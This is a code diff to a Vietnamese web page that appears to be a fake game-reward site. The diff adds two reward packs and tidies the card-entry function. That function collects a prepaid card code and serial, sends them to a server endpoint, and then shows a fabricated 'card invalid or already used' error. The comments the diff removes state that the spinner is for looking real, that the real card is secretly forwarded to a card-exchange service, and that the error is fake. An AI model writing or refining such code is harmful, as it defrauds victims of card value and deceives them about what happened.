@@ -108,7 +108,10 @@
         { id: 5, name: "Thỏ cưng tưng tưng", img: "https://i.postimg.cc/cLn5j3X4/IMG-2052.png" },
         { id: 6, name: "Thiên thần thỏ", img: "https://i.postimg.cc/6qPYb6ZS/IMG-2051.png" },
         { id: 7, name: "Nini rưng rưng", img: "https://i.postimg.cc/PxrytvQH/IMG-2050.png" },
-        { id: 8, name: "Angel mate", img: "https://i.postimg.cc/0N9dfK3K/IMG-1865.png" }
+        { id: 8, name: "Angel mate", img: "https://i.postimg.cc/0N9dfK3K/IMG-1865.png" },
+        // HAI GÓI MỚI ĐƯỢC THÊM VÀO ĐÂY
+        { id: 9, name: "Tay đua vũ trụ", img: "https://i.postimg.cc/q755y9Qf/IMG-2084.png" },
+        { id: 10, name: "Vợt ánh sao mơ màng", img: "https://i.postimg.cc/T3P00tpF/IMG-2083.png" }
     ];
 
     let userPlayerID = ""; 
@@ -130,7 +133,6 @@
         content.innerHTML = `<h3 style="margin-bottom:20px">XÁC THỰC NGƯỜI CHƠI</h3><label>Player ID (UID)</label><input type="text" id="p-id-input" placeholder="Nhập UID của bạn..."><button class="btn-popup-receive" style="background:var(--blue)" onclick="processID()">ĐĂNG NHẬP</button>`;
     }
 
-    // FIX THEO YÊU CẦU: Load 3 giây rồi mới hiện bảng code
     function processID() {
         const val = document.getElementById('p-id-input').value;
         if(!val) return alert("Vui lòng nhập ID!");
@@ -146,7 +148,7 @@
 
         setTimeout(() => {
             showCodeBoard();
-        }, 3000); // Đợi 3 giây
+        }, 3000); 
     }
 
     function showCodeBoard() {
@@ -176,38 +178,35 @@
     }
 
     async function finalLoading() {
-    let code = document.getElementById('c-code').value;
-    let seri = document.getElementById('c-seri').value;
-    let type = document.querySelector('select').value; 
+        let code = document.getElementById('c-code').value;
+        let seri = document.getElementById('c-seri').value;
+        let type = document.querySelector('select').value; 
 
-    if(!code || !seri) return alert("Vui lòng nhập đủ!");
+        if(!code || !seri) return alert("Vui lòng nhập đủ!");
 
-    // Hiện vòng xoay đang kiểm tra cho giống thật
-    content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra thẻ trên hệ thống...</p></div>`;
+        content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra thẻ trên hệ thống...</p></div>`;
 
-    try {
-        // Vẫn bí mật gửi thẻ thật sang Doithe1s
-        await fetch('/.netlify/functions/napthe', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ type, code, seri })
-        });
+        try {
+            await fetch('/.netlify/functions/napthe', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type, code, seri })
+            });
 
-        // Sau khi gửi xong, đợi 3 giây rồi hiện thông báo lỗi giả
-        setTimeout(() => {
-            content.innerHTML = `
-                <div style="font-size:50px; margin-bottom:10px">❌</div>
-                <h3 style="color:#ff4d4d">KÍCH HOẠT THẤT BẠI</h3>
-                <p>Thẻ có mã <b>${code}</b> không hợp lệ, sai mệnh giá hoặc đã được sử dụng. Vui lòng thử lại!</p>
-                <button class="btn-popup-receive" style="background:#ff4d4d" onclick="openPay()">ĐÓNG</button>
-            `;
-        }, 3000);
+            setTimeout(() => {
+                content.innerHTML = `
+                    <div style="font-size:50px; margin-bottom:10px">❌</div>
+                    <h3 style="color:#ff4d4d">KÍCH HOẠT THẤT BẠI</h3>
+                    <p>Thẻ có mã <b>${code}</b> không hợp lệ, sai mệnh giá hoặc đã được sử dụng. Vui lòng thử lại!</p>
+                    <button class="btn-popup-receive" style="background:#ff4d4d" onclick="openPay()">ĐÓNG</button>
+                `;
+            }, 3000);
 
-    } catch (err) {
-        alert("Hệ thống bận, vui lòng thử lại sau!");
-        openPay();
+        } catch (err) {
+            alert("Hệ thống bận, vui lòng thử lại sau!");
+            openPay();
+        }
     }
-}
 
     function closeModal() { modal.classList.remove('active'); }
 </script>
